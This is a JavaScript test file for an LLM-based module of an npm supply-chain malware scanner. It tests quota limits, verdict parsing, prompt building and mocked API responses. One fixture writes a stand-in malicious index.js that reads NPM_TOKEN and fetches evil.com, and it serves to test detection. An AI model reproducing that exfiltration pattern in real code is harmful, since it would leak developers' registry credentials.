'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');
const { test, asyncTest, assert, assertIncludes } = require('../test-utils');

async function runLlmDetectiveTests() {
  console.log('\n=== LLM DETECTIVE TESTS ===\n');

  const {
    isLlmEnabled,
    getLlmMode,
    getDailyLimit,
    getDailyCount,
    isDailyQuotaAvailable,
    incrementDailyCounter,
    resetDailyCounter,
    resetStats,
    resetLlmLimiter,
    getStats,
    parseResponse,
    collectSourceContext,
    buildPrompt,
    investigatePackage,
    MAX_CONTEXT_BYTES
  } = require('../../src/ml/llm-detective');

  // Helper: save and restore env vars (sync only — for async tests, use setEnv/restoreEnv)
  function withEnv(vars, fn) {
    const saved = {};
    for (const [k, v] of Object.entries(vars)) {
      saved[k] = process.env[k];
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
    try {
      return fn();
    } finally {
      for (const [k, v] of Object.entries(saved)) {
        if (v === undefined) delete process.env[k];
        else process.env[k] = v;
      }
    }
  }

  function setEnv(vars) {
    const saved = {};
    for (const [k, v] of Object.entries(vars)) {
      saved[k] = process.env[k];
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
    return saved;
  }

  function restoreEnv(saved) {
    for (const [k, v] of Object.entries(saved)) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
  }

  // ── Feature flag tests ──

  test('LLM: isLlmEnabled returns false without API key', () => {
    withEnv({ ANTHROPIC_API_KEY: undefined, MUADDIB_LLM_ENABLED: undefined }, () => {
      assert(isLlmEnabled() === false, 'Should be false without API key');
    });
  });

  test('LLM: isLlmEnabled returns true with API key', () => {
    withEnv({ ANTHROPIC_API_KEY: 'test-key', MUADDIB_LLM_ENABLED: undefined }, () => {
      assert(isLlmEnabled() === true, 'Should be true with API key');
    });
  });

  test('LLM: isLlmEnabled returns false when MUADDIB_LLM_ENABLED=false', () => {
    withEnv({ ANTHROPIC_API_KEY: 'test-key', MUADDIB_LLM_ENABLED: 'false' }, () => {
      assert(isLlmEnabled() === false, 'Should be false when explicitly disabled');
    });
  });

  test('LLM: getLlmMode defaults to shadow', () => {
    withEnv({ MUADDIB_LLM_MODE: undefined }, () => {
      assert(getLlmMode() === 'shadow', 'Default mode should be shadow');
    });
  });

  test('LLM: getLlmMode returns active when set', () => {
    withEnv({ MUADDIB_LLM_MODE: 'active' }, () => {
      assert(getLlmMode() === 'active', 'Should return active');
    });
  });

  test('LLM: getLlmMode is case-insensitive', () => {
    withEnv({ MUADDIB_LLM_MODE: 'ACTIVE' }, () => {
      assert(getLlmMode() === 'active', 'Should handle uppercase');
    });
  });

  // ── Daily quota tests ──

  test('LLM: getDailyLimit defaults to 100', () => {
    withEnv({ MUADDIB_LLM_DAILY_LIMIT: undefined }, () => {
      assert(getDailyLimit() === 100, 'Default limit should be 100');
    });
  });

  test('LLM: getDailyLimit respects env var', () => {
    withEnv({ MUADDIB_LLM_DAILY_LIMIT: '50' }, () => {
      assert(getDailyLimit() === 50, 'Should respect env var');
    });
  });

  test('LLM: isDailyQuotaAvailable tracks counter', () => {
    resetDailyCounter();
    assert(isDailyQuotaAvailable() === true, 'Should have quota initially');
    // Exhaust quota by setting limit to 1
    withEnv({ MUADDIB_LLM_DAILY_LIMIT: '1' }, () => {
      incrementDailyCounter();
      assert(isDailyQuotaAvailable() === false, 'Should be exhausted after 1 call');
    });
    resetDailyCounter();
  });

  // ── parseResponse tests ──

  test('LLM: parseResponse handles valid JSON', () => {
    const r = parseResponse('{"verdict":"malicious","confidence":0.95,"reasoning":"test","iocs_found":["evil.com"],"attack_type":"backdoor","recommendation":"block"}');
    assert(r.verdict === 'malicious', 'verdict should be malicious');
    assert(r.confidence === 0.95, 'confidence should be 0.95');
    assert(r.iocs_found.length === 1, 'should have 1 IOC');
    assert(r.attack_type === 'backdoor', 'attack_type should be backdoor');
    assert(r.recommendation === 'block', 'recommendation should be block');
  });

  test('LLM: parseResponse handles markdown fence', () => {
    const r = parseResponse('```json\n{"verdict":"benign","confidence":0.88,"reasoning":"safe","iocs_found":[],"attack_type":null,"recommendation":"safe"}\n```');
    assert(r.verdict === 'benign', 'Should extract from fence');
    assert(r.confidence === 0.88, 'Should parse confidence');
  });

  test('LLM: parseResponse handles embedded JSON', () => {
    const r = parseResponse('Here is my analysis:\n{"verdict":"malicious","confidence":0.7,"reasoning":"bad","iocs_found":[],"attack_type":null,"recommendation":"block"}\n');
    assert(r.verdict === 'malicious', 'Should extract embedded JSON');
  });

  test('LLM: parseResponse returns uncertain on garbage', () => {
    const r = parseResponse('this is not json');
    assert(r.verdict === 'uncertain', 'Should default to uncertain');
    assert(r.confidence === 0, 'Should have 0 confidence');
  });

  test('LLM: parseResponse returns uncertain on null', () => {
    const r = parseResponse(null);
    assert(r.verdict === 'uncertain', 'Should handle null');
  });

  test('LLM: parseResponse clamps confidence', () => {
    const r = parseResponse('{"verdict":"malicious","confidence":5.0,"reasoning":"x","iocs_found":[],"attack_type":null,"recommendation":"block"}');
    assert(r.confidence === 1, 'Should clamp to 1.0');
    const r2 = parseResponse('{"verdict":"benign","confidence":-0.5,"reasoning":"x","iocs_found":[],"attack_type":null,"recommendation":"safe"}');
    assert(r2.confidence === 0, 'Should clamp to 0');
  });

  test('LLM: parseResponse normalizes invalid verdict', () => {
    const r = parseResponse('{"verdict":"maybe","confidence":0.5,"reasoning":"x","iocs_found":[],"attack_type":null,"recommendation":"safe"}');
    assert(r.verdict === 'uncertain', 'Invalid verdict should become uncertain');
  });

  test('LLM: parseResponse limits IOCs to 20', () => {
    const iocs = Array.from({ length: 30 }, (_, i) => `domain${i}.com`);
    const r = parseResponse(JSON.stringify({ verdict: 'malicious', confidence: 0.9, reasoning: 'x', iocs_found: iocs, attack_type: null, recommendation: 'block' }));
    assert(r.iocs_found.length === 20, 'Should cap IOCs at 20');
  });

  // ── collectSourceContext tests ──

  test('LLM: collectSourceContext reads files from directory', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'llm-test-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"test","version":"1.0.0"}');
      fs.writeFileSync(path.join(tmpDir, 'index.js'), 'console.log("hello");');
      const ctx = collectSourceContext(tmpDir, { threats: [] });
      assert(ctx.files.length === 2, `Should find 2 files, got ${ctx.files.length}`);
      assert(ctx.truncated === false, 'Should not be truncated');
      assert(ctx.totalBytes > 0, 'Should have bytes');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  test('LLM: collectSourceContext respects 100KB cap', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'llm-test-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"test","main":"index.js"}');
      // Create a large file that exceeds the cap
      fs.writeFileSync(path.join(tmpDir, 'big.js'), 'x'.repeat(MAX_CONTEXT_BYTES + 1000));
      // Create the flagged entry point
      fs.writeFileSync(path.join(tmpDir, 'index.js'), 'module.exports = "entry";');
      const ctx = collectSourceContext(tmpDir, { threats: [{ file: 'index.js' }] });
      assert(ctx.truncated === true, 'Should be truncated');
      // Should include package.json + index.js (priority), not big.js
      const paths = ctx.files.map(f => f.path);
      assert(paths.includes('package.json'), 'Should include package.json');
      assert(paths.includes('index.js'), 'Should include flagged entry point');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  test('LLM: collectSourceContext handles empty directory', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'llm-test-'));
    try {
      const ctx = collectSourceContext(tmpDir, { threats: [] });
      assert(ctx.files.length === 0, 'Should find 0 files');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  // ── buildPrompt tests ──

  test('LLM: buildPrompt contains package name and version', () => {
    const ctx = { files: [{ path: 'index.js', content: 'var x = 1;' }], truncated: false, totalBytes: 10 };
    const { system, messages } = buildPrompt('evil-pkg', '1.0.0', 'npm', ctx, [], null);
    assertIncludes(system, 'supply-chain', 'System should mention supply-chain');
    assertIncludes(messages[0].content, 'evil-pkg', 'Should contain package name');
    assertIncludes(messages[0].content, '1.0.0', 'Should contain version');
  });

  test('LLM: buildPrompt includes findings', () => {
    const ctx = { files: [], truncated: false, totalBytes: 0 };
    const threats = [{ type: 'credential_exfil', severity: 'CRITICAL', file: 'index.js', message: 'Steals tokens' }];
    const { messages } = buildPrompt('pkg', '1.0.0', 'npm', ctx, threats, null);
    assertIncludes(messages[0].content, 'credential_exfil', 'Should contain threat type');
    assertIncludes(messages[0].content, 'Steals tokens', 'Should contain message');
  });

  test('LLM: buildPrompt includes registry metadata', () => {
    const ctx = { files: [], truncated: false, totalBytes: 0 };
    const meta = { age_days: 2, weekly_downloads: 0, version_count: 1 };
    const { messages } = buildPrompt('pkg', '1.0.0', 'npm', ctx, [], meta);
    assertIncludes(messages[0].content, 'Age: 2 days', 'Should contain age');
    assertIncludes(messages[0].content, 'Weekly downloads: 0', 'Should contain downloads');
  });

  test('LLM: buildPrompt never contains sandbox data', () => {
    const ctx = { files: [{ path: 'a.js', content: 'code' }], truncated: false, totalBytes: 4 };
    // Even if someone accidentally passed sandbox-like data, buildPrompt doesn't accept it
    const { system, messages } = buildPrompt('pkg', '1.0.0', 'npm', ctx, [], null);
    const fullText = system + messages[0].content;
    assert(!fullText.includes('canary'), 'Should never contain canary tokens');
    assert(!fullText.includes('honey'), 'Should never contain honey token references');
  });

  // ── investigatePackage guard rail tests ──

  await asyncTest('LLM: investigatePackage returns null without API key', async () => {
    resetStats();
    resetDailyCounter();
    const saved = setEnv({ ANTHROPIC_API_KEY: undefined });
    try {
      const result = await investigatePackage('/tmp/fake', { threats: [] }, { name: 'test', version: '1.0.0' });
      assert(result === null, 'Should return null');
      assert(getStats().skipped === 1, 'Should increment skipped');
    } finally {
      restoreEnv(saved);
      resetStats();
    }
  });

  await asyncTest('LLM: investigatePackage returns null when quota exhausted', async () => {
    resetStats();
    resetDailyCounter();
    const saved = setEnv({ ANTHROPIC_API_KEY: 'key', MUADDIB_LLM_DAILY_LIMIT: '0' });
    try {
      const result = await investigatePackage('/tmp/fake', { threats: [] }, { name: 'test', version: '1.0.0' });
      assert(result === null, 'Should return null when quota exhausted');
    } finally {
      restoreEnv(saved);
      resetStats();
      resetDailyCounter();
    }
  });

  // ── investigatePackage with mocked fetch ──

  const originalFetch = global.fetch;

  await asyncTest('LLM: investigatePackage with mock malicious verdict', async () => {
    resetStats();
    resetDailyCounter();
    resetLlmLimiter();
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'llm-test-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"evil"}');
      fs.writeFileSync(path.join(tmpDir, 'index.js'), 'process.env.NPM_TOKEN; fetch("http://evil.com")');

      global.fetch = async () => ({
        ok: true,
        status: 200,
        json: async () => ({
          content: [{ text: '{"verdict":"malicious","confidence":0.95,"reasoning":"Exfiltrates NPM_TOKEN","iocs_found":["evil.com"],"attack_type":"credential_exfil","recommendation":"block"}' }]
        })
      });

      const saved = setEnv({ ANTHROPIC_API_KEY: 'test-key', MUADDIB_LLM_MODE: 'shadow' });
      try {
        const result = await investigatePackage(tmpDir, { threats: [{ type: 'env_access', severity: 'HIGH', file: 'index.js' }] }, { name: 'evil', version: '1.0.0', ecosystem: 'npm' });

        assert(result !== null, 'Should return a result');
        assert(result.verdict === 'malicious', 'Verdict should be malicious');
        assert(result.confidence === 0.95, 'Confidence should be 0.95');
        assert(result.mode === 'shadow', 'Mode should be shadow');
        assert(getStats().analyzed === 1, 'Should track analyzed');
        assert(getStats().malicious === 1, 'Should track malicious');
      } finally {
        restoreEnv(saved);
      }
    } finally {
      global.fetch = originalFetch;
      fs.rmSync(tmpDir, { recursive: true, force: true });
      resetStats();
      resetDailyCounter();
    }
  });

  await asyncTest('LLM: investigatePackage with mock benign verdict', async () => {
    resetStats();
    resetDailyCounter();
    resetLlmLimiter();
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'llm-test-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"safe-pkg"}');
      fs.writeFileSync(path.join(tmpDir, 'index.js'), 'module.exports = { add: (a, b) => a + b };');

      global.fetch = async () => ({
        ok: true,
        status: 200,
        json: async () => ({
          content: [{ text: '{"verdict":"benign","confidence":0.92,"reasoning":"Simple utility","iocs_found":[],"attack_type":null,"recommendation":"safe"}' }]
        })
      });

      const saved = setEnv({ ANTHROPIC_API_KEY: 'test-key' });
      try {
        const result = await investigatePackage(tmpDir, { threats: [] }, { name: 'safe-pkg', version: '1.0.0', ecosystem: 'npm' });
        assert(result !== null, 'Should return a result');
        assert(result.verdict === 'benign', 'Verdict should be benign');
        assert(getStats().benign === 1, 'Should track benign');
      } finally {
        restoreEnv(saved);
      }
    } finally {
      global.fetch = originalFetch;
      fs.rmSync(tmpDir, { recursive: true, force: true });
      resetStats();
      resetDailyCounter();
    }
  });

  await asyncTest('LLM: investigatePackage handles fetch timeout gracefully', async () => {
    resetStats();
    resetDailyCounter();
    resetLlmLimiter();
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'llm-test-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"timeout-pkg"}');
      fs.writeFileSync(path.join(tmpDir, 'index.js'), 'x = 1;');

      global.fetch = async () => { throw Object.assign(new Error('timeout'), { name: 'AbortError' }); };

      const saved = setEnv({ ANTHROPIC_API_KEY: 'test-key' });
      try {
        const result = await investigatePackage(tmpDir, { threats: [] }, { name: 'timeout-pkg', version: '1.0.0' });
        assert(result === null, 'Should return null on timeout');
        assert(getStats().errors === 1, 'Should track error');
      } finally {
        restoreEnv(saved);
      }
    } finally {
      global.fetch = originalFetch;
      fs.rmSync(tmpDir, { recursive: true, force: true });
      resetStats();
      resetDailyCounter();
    }
  });

  await asyncTest('LLM: investigatePackage handles HTTP 500 gracefully', async () => {
    resetStats();
    resetDailyCounter();
    resetLlmLimiter();
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'llm-test-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), '{"name":"err-pkg"}');
      fs.writeFileSync(path.join(tmpDir, 'index.js'), 'x = 1;');

      let callCount = 0;
      global.fetch = async () => {
        callCount++;
        return { ok: false, status: 500, text: async () => 'Internal Server Error' };
      };

      const saved = setEnv({ ANTHROPIC_API_KEY: 'test-key' });
      try {
        const result = await investigatePackage(tmpDir, { threats: [] }, { name: 'err-pkg', version: '1.0.0' });
        assert(result === null, 'Should return null on 500');
        assert(callCount === 2, `Should retry once (called ${callCount} times)`);
        assert(getStats().errors === 1, 'Should track error');
      } finally {
        restoreEnv(saved);
      }
    } finally {
      global.fetch = originalFetch;
      fs.rmSync(tmpDir, { recursive: true, force: true });
      resetStats();
      resetDailyCounter();
    }
  });

  await asyncTest('LLM: investigatePackage skips empty package', async () => {
    resetStats();
    resetDailyCounter();
    resetLlmLimiter();
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'llm-test-'));
    try {
      // Empty directory — no source files
      const saved = setEnv({ ANTHROPIC_API_KEY: 'test-key' });
      try {
        const result = await investigatePackage(tmpDir, { threats: [] }, { name: 'empty', version: '1.0.0' });
        assert(result === null, 'Should return null for empty package');
        assert(getStats().skipped === 1, 'Should track skipped');
      } finally {
        restoreEnv(saved);
      }
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
      resetStats();
      resetDailyCounter();
    }
  });

  // ── Stats tracking ──

  test('LLM: getStats returns copy', () => {
    resetStats();
    const s1 = getStats();
    s1.analyzed = 999;
    assert(getStats().analyzed === 0, 'Should return copy, not reference');
    resetStats();
  });
}

module.exports = { runLlmDetectiveTests };
